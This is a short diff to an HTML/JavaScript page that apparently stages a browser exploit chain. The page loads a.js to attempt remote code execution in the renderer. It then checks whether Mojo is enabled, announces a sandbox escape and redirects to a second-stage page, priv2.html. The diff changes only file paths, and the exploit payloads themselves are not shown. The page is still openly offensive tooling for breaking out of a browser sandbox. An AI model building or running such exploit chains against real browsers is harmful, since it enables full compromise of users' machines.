@@ -14,7 +14,7 @@
 
         if (this.Mojo === undefined) {
             //var blobURL = URL.createObjectURL(new Blob(['(', getConfuseObject.toString(), ')()'], { type: 'application/javascript' }));
-            var url = "./a.js";
+            var url = "a.js";
             function startExploit() {
                 document.close();   
                 document.write("<h1>trying to get rce in render</h1>");
@@ -56,7 +56,7 @@
         } else {
             print("rce succeed and mojo is enabled, begin to escap from sandbox");
 
-            window.location.replace("./priv2.html");
+            window.location.replace("priv2.html");
         }
     </script>
 </body>
